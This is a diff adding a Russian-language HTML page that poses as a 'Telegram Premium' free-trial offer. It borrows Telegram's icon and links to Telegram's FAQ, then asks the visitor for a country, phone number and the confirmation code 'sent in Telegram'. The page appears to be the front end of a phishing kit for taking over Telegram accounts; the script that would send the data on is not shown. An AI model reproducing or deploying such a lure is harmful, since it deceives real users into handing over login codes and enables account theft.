@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css"> 
+    <link rel="icon" type="image/png" sizes="144x144" href="https://web.telegram.org/k/assets/img/android-chrome-144x144.png?v=jw3mK7G9Ry">   
+    <title>Telegram Premium</title>
+</head>
+<body>
+    <div class="main">
+        <div id="ex1" class="modal">
+            <p>Некорректный ввод номера</p>
+            <a href="#" rel="modal:close">Close</a>
+        </div>        
+        <div class="header"></div>
+        <div class="content">
+            <div id="confirmation" class="form">
+                <div class="logo">
+                    <img src="media/chains.png" alt="">
+                </div>
+                <div class="title">Telegram Premium</div>
+                <div class="desc">Продолжая пользование ресурсом вы соглашаетесь с <a class="conf_link" href="#">Политикой конфиденциальности</a></div>
+                <span id="confirm_rules" class="btn_primary">Продолжить</span>               
+            </div>
+            <div id="form_hello" class="form">
+                <div class="logo">
+                    <img src="media/logo.png" alt="">
+                </div>
+                <div class="title">Telegram Premium</div>
+                <div class="desc">Бесплатный пробный доступ к расширенной версии Telegram на 30 дней</div>
+                <span id="to_form_start_process" class="btn_primary">Продолжить</span>
+                <a id="info_prem" href="https://telegram.org/faq_premium" class="btn_secondary">Преимущетсва</a>
+            </div>
+            <div id="form_start_process" class="form">
+                <div class="logo">
+                    <img src="media/logo.png" alt="">
+                </div>
+                <div class="title">Telegram Premium</div>
+                <div class="desc">Пожалуйста, выберите свою страну и введите номер телефона</div>
+                <div class="dropdown_countries">
+                    <div data-country-code="RU" data-phone-code="+7" title="Россия" class="dc_option">
+                        <img src="flags/RU.png" alt="Россия">
+                        <span class="country_name">Россия</span>
+                    </div>
+                    <div data-country-code="UA" data-phone-code="+380" title="Украина" class="dc_option">
+                        <img src="flags/UA.png" alt="Украина">
+                        <span class="country_name">Украина</span>
+                    </div>
+                </div>
+                <span id="choosen_country" data-country-code="" data-phone-code="">
+                    <img src="" alt="">
+                    <span class="country_name"></span>
+                </span>
+                <input type="text" name="" id="phone_number">
+                <span id="send_code" class="btn_primary">Далее</span>
+            </div>
+            <div id="form_get_code" class="form">
+                <div class="logo">
+                    <img src="media/logo.png" alt="">
+                </div>
+                <div class="title">Telegram Premium</div>
+                <div class="desc">Мы выслали вам сообщение в Telegram с кодом подтверждения</div>
+                <input type="number" placeholder="Код" name="" id="code">                 
+            </div>
+            <div id="loading" class="form">
+                <img src="media/91.gif" alt="">
+            </div>           
+        </div>
+        <div class="footer">
+            <a id="to_modal_phone_error" href="#ex1" rel="modal:open">Open Modal</a>
+        </div>
+    </div>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.css" />
+    <script src="mask.js"></script>
+    <script src="script.js"></script>    
+</body>
+</html>
